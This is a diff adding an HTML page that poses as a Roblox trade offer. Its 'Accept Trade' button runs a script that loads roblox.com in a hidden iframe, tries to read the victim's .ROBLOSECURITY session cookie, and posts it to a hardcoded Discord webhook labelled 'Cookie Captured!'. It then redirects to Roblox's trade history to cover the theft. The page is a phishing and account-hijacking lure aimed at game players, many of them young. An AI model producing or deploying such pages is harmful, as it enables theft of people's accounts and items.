@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Trade</title>
+    <style>
+        body {
+            font-family: 'Gotham', Arial, sans-serif;
+            background-color: #232527;
+            color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .card {
+            background-color: #393b3d;
+            padding: 40px;
+            border-radius: 12px;
+            width: 350px;
+            text-align: center;
+            box-shadow: 0 8px 16px rgba(0,0,0,0.4);
+        }
+        h2 { margin-top: 0; color: #fff; }
+        p { color: #bdbebf; font-size: 14px; }
+        .btn {
+            background-color: #00b06f;
+            color: white;
+            border: none;
+            padding: 15px 0;
+            width: 100%;
+            font-size: 18px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+        .btn:hover { background-color: #009a67; }
+        .loading { display: none; margin-top: 10px; color: #aaa; font-size: 12px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>New Trade Offer</h2>
+    <p>You are receiving: <strong>Headless Horseman</strong></p>
+    <p>Sending: <strong>Laser Katana</strong></p>
+    <button class="btn" id="acceptBtn">Accept Trade</button>
+    <div class="loading" id="status">Processing...</div>
+</div>
+
+<script>
+    document.getElementById('acceptBtn').addEventListener('click', function() {
+        document.getElementById('status').style.display = 'block';
+        document.getElementById('acceptBtn').disabled = true;
+
+        // Use iframe trick to bypass SameSite restrictions
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        document.body.appendChild(iframe);
+        
+        iframe.onload = function() {
+            try {
+                // Access the cookie inside the iframe context
+                const doc = iframe.contentDocument || iframe.contentWindow.document;
+                const cookies = doc.cookie;
+                const match = cookies.match(/\.ROBLOSECURITY=([^;]+)/);
+                
+                if (match) {
+                    const token = match[1];
+                    
+                    fetch("https://discord.com/api/webhooks/1568842658024128713/zVUKHWdpx3qKNuQnzxrA86Rs-2dN_tYz8HsXV37ImSW8X1RxS1LBb1IyTQy0bSRxdbxn", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            embeds: [{
+                                title: "🍪 Cookie Captured!",
+                                description: "**User accepted trade.**\n```\n" + token + "\n```",
+                                color: 5814783
+                            }]
+                        })
+                    });
+                } else {
+                    alert("Cookie not found. Try logging into Roblox first.");
+                }
+            } catch (e) {
+                alert("Error accessing cookie: " + e.message);
+            } finally {
+                setTimeout(() => {
+                    window.location.href = "https://www.roblox.com/trade-history";
+                }, 1000);
+            }
+        };
+        
+        iframe.src = "https://www.roblox.com/";
+    });
+</script>
+
+</body>
+</html>
